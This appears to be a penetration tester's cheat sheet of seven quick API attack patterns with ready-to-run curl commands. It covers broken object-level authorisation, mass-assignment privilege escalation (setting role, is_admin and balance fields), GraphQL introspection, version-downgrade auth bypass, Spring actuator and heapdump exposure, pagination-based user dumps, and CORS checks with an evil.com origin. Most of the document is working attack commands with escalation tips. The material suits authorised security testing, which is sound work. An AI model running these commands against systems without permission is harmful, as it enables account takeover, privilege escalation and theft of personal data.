# Proven API Attack Patterns

Quick-check patterns with high hit rates. Run these first in Phase 2/3 before systematic testing.

## Pattern 1: BOLA on /api/users/{id}

**Hit rate:** Very high — most common API vulnerability
**Check:**
```bash
# Get your own user ID from token or profile endpoint
# Then try accessing another user's profile
curl -sk -H "Authorization: Bearer $TOKEN_A" "$BASE_URL/api/users/$USER_B_ID"
```
**Variants:** /api/accounts/{id}, /api/profiles/{id}, /api/members/{id}
**Escalation:** If read works, try PUT/PATCH (modify other user's data)

## Pattern 2: Mass Assignment on Registration/Update

**Hit rate:** High — developers often bind all JSON fields to model
**Check:**
```bash
# Add role/admin/verified fields to registration
curl -sk -X POST "$BASE_URL/api/register" -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"Test1234!","role":"admin","is_admin":true,"verified":true}'

# Add fields to profile update
curl -sk -X PUT "$BASE_URL/api/users/me" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","role":"admin","balance":99999,"is_staff":true}'
```
**Fields to try:** role, is_admin, is_staff, verified, balance, credits, plan, tier, permissions

## Pattern 3: GraphQL Introspection Enabled

**Hit rate:** High — many APIs leave introspection on in production
**Check:**
```bash
curl -s "$BASE_URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name } } mutationType { fields { name } } } }"}'
```
**Escalation:** Map all mutations → test each without auth → find unprotected writes

## Pattern 4: API Version Downgrade Auth Bypass

**Hit rate:** Medium — older versions often lack auth added later
**Check:**
```bash
# If /api/v2/admin returns 401, try older versions
for v in v0 v1 beta internal legacy; do
  curl -sk -o /dev/null -w "%{http_code} /api/$v/admin/users\n" "$BASE_URL/api/$v/admin/users"
done
```
**Why it works:** Auth middleware added to v2 routes but v1 routes still registered

## Pattern 5: Actuator/Debug Endpoint Exposure

**Hit rate:** Medium-high on Java/Spring APIs
**Check:**
```bash
for path in /actuator /actuator/env /actuator/heapdump /actuator/configprops \
  /debug /metrics /health /info /trace /api/debug; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "$BASE_URL$path")
  [ "$code" = "200" ] && echo "EXPOSED: $path"
done
```
**Impact:** /actuator/env = credential leak (High), /actuator/heapdump = full memory dump (Critical)

## Pattern 6: Pagination Bypass for Data Dump

**Hit rate:** Medium — list endpoints often don't cap page_size
**Check:**
```bash
# Try absurd page sizes
curl -sk -H "Authorization: Bearer $TOKEN" "$BASE_URL/api/users?page_size=99999"
curl -sk -H "Authorization: Bearer $TOKEN" "$BASE_URL/api/users?limit=99999&offset=0"
# Also try: per_page, count, size, rows
```
**Impact:** Full user enumeration, PII exposure

## Pattern 7: CORS Misconfiguration on API

**Hit rate:** Medium
**Check:**
```bash
curl -sk -H "Origin: https://evil.com" -I "$BASE_URL/api/users" | grep -i access-control
curl -sk -H "Origin: null" -I "$BASE_URL/api/users" | grep -i access-control
```
**Impact:** If reflects origin + allows credentials → steal tokens via victim's browser

---

## When to Add New Patterns

Add after engagement when:
- Pattern produced a confirmed finding (accepted or verified exploitable)
- Applies to multiple API types (not target-specific)
- Can be checked in <2 minutes
